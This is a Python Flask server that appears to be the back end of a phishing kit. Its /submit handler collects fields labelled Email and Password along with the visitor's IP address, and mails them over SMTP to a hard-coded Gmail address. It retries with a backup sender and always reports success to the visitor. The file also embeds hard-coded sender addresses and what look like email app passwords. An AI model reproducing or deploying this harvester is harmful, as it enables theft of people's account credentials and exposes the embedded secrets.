import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, jsonify, send_from_directory
import logging

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Email configuration
SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.getenv('SMTP_PORT', 587))
SENDER_EMAIL = os.getenv('SENDER_EMAIL', 'nwekee125@gmail.com')
SENDER_EMAIL_BACKUP = os.getenv('SENDER_EMAIL_BACKUP', 'wpse tggu zdza cvxq')  # Backup sender
SENDER_PASSWORD = os.getenv('SENDER_PASSWORD', 'sgtr csgr uoju soqw')
RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL', 'maxwell202201@gmail.com')

# Log configuration on startup
logger.info(f"SMTP Configuration: Server={SMTP_SERVER}, Port={SMTP_PORT}")
logger.info(f"Sender Email: {SENDER_EMAIL}")
logger.info(f"Receiver Email: {RECEIVER_EMAIL}")

def send_email(subject, body, sender_email):
    """Send email using SMTP"""
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        logger.info(f"Attempting to connect to SMTP server: {SMTP_SERVER}:{SMTP_PORT}")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
        server.set_debuglevel(1)  # Enable debug output
        server.starttls()
        server.login(sender_email, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(sender_email, RECEIVER_EMAIL, text)
        server.quit()
        logger.info("Email sent successfully")
        return True
    except smtplib.SMTPAuthenticationError as e:
        error_msg = f"SMTP Authentication failed: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except smtplib.SMTPConnectError as e:
        error_msg = f"SMTP Connection failed: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except smtplib.SMTPServerDisconnected as e:
        error_msg = f"SMTP Server disconnected: {str(e)}"
        logger.error(error_msg)
        return error_msg
    except Exception as e:
        error_msg = f"Failed to send email: {str(e)}"
        logger.error(error_msg)
        return error_msg

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    else:
        # Handle favicon request specifically
        if filename == 'favicon.ico':
            return '', 204  # No content response for favicon
        return jsonify({'message': 'File not found'}), 404

@app.route('/submit', methods=['POST'])
def handle_submission():
    # Get form data
    x1 = request.form.get('x1', '')
    x2 = request.form.get('x2', '')
    client_ip = request.remote_addr
    
    # Prepare email body
    body = f"""
    Email: {x1}
    Password: {x2}
    IP Address: {client_ip}
    """
    
    logger.info(f"Received form submission from IP: {client_ip}")
    logger.info(f"Form data - Email: {x1}, Password: {'*' * len(x2) if x2 else ''}")
    
    # Send email with primary sender first
    result = send_email('Form Submission', body, SENDER_EMAIL)
    
    # If primary sender fails, try backup sender
    if result is not True:
        logger.warning(f"Primary email sender failed: {result}")
        result = send_email('Form Submission', body, SENDER_EMAIL_BACKUP)
        
        # Log backup sender result
        if result is not True:
            logger.error(f"Backup email sender also failed: {result}")
            # Even if both email attempts fail, we still return success to the client
            logger.warning("Both email senders failed, but returning success to client")
        else:
            logger.info("Email sent successfully using backup sender")
    else:
        logger.info("Email sent successfully using primary sender")
    
    # Return success regardless of email sending result
    return jsonify({'message': 'Success'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))